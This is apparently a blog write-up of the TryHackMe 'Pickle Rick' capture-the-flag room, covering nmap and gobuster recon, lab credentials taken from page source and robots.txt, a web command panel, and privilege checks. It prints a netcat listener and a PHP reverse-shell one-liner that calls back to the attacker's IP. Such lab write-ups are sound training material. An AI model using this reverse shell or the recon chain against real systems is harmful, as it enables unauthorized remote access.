---
title: "Pickle Rick - THM"
date: 2025-12-07 00:00:00 +0800
categories: [CTF]
tags: [ctf, thm, tryhackme, easy]
---

# **🏴 PICKLE RICK - Write-up**

---

- ## 📄 DESCRIPTION :


**This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.**

**Lab-Link: https://tryhackme.com/room/picklerick**


**Room difficulty : Easy**

![image](images/image2.jpg)

Deploy the virtual machine on this task and explore the web application : 10.10.181.250

--- 

- ## 👣 STEPS :

### RECON 🔍 :

We start with a nmap scan to find open ports on the machine.

```
nmap -A 10.10.181.250 -T4
```
The options I use :

| OPTION | MEANING | DESCRIPTION |
| -- | -- | -- |
| `-A` | Agressive Scan | Enables OS detection, version detection, script scanning, and traceroute. |
| `-T4` | Agressive Timing | Makes the scan faster than the default but still relatively stable. |


⚠️ Both are fine in CTFs or authorized tests but can be intrusive on real networks.




By default, Nmap scans the 1000 most common ports. I run another Nmap scan in parallel using the `-p-` option to cover all ports, , just in case we missed any ports with the first scan.
```
nmap -p- 10.10.181.255 -T4
```

![nmap](images/scanmap.png)


Ports 22 (SSH) and 80 (HTTP) are open. Before taking a look at the webpage, we run a GoBuster scan to enumerate the Web Application's directories :

```
gobuster dir -w /home/kali/Downloads/SecLists/Discovery/Web-Content/common.txt -u http://10.10.181.250 -x php,html,txt,json
```
While it's running, we can take a look at the web page 


![WebPage](images/PageWeb.png)


By looking at the page's source code, we can see that the username is mentioned.

![CodeSource](images/codesource.png)

Meanwhile, the Gobuster scan finished, and we obtained the following results :

![Goresults](images/goresults.png)

The `/assets` directory holds GIF, CSS, and JS files for the site, with nothing noteworthy.
So we'll focus on the two other results :
- **login.php**

This page contains a login panel : 

![login](images/login.png)

- **robots.txt**

This file may contain useful informations. In this case, however, it’s a non-standard file containing just a curious word : **'Wubbalubbadubdub'** 

![robot](images/robot.png)


Possible password for the previously found username, let's try logging in :

- `R1ckRul3s : Wubbalubbadubdub`

---

### Web Page :


After logging in, we explore the application. Top menu links are mostly denied, but the Commands page looks interesting. The ls command returns :

![commandpanel](images/commandpanel.png)

---

### Escalating to a proper shell :

On our local machine we start a netcat listener :

```
nc -nlvp 4444
```

And execute a PHP Reverse Shell on the command panel :

```
php -r '$sock=fsockopen("MyIPAdress",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![shell](images/propershell.png)

We found our first ingredient in the `Sup3rS3cretPickl3Ingred.txt` file

![flag1](images/flag1.png)

Opening the `clue.txt` file gives us a hint for what comes next.

![clue](images/clue.png)

--- 

### Checking user privileges :

Before continuing, we run `sudo -l` to check which sudo privileges we have.

![sudo](images/sudo.png)

It shows that the 'www-data' account can run commands as root without needing a password.

---
### Research :

By exploring the machine, we’re able to obtain the other ingredients.

![flag2](images/flag2.png)

![flag3](images/flag3.png)



## **✅ The challenge is complete, all ingredients have been found.**



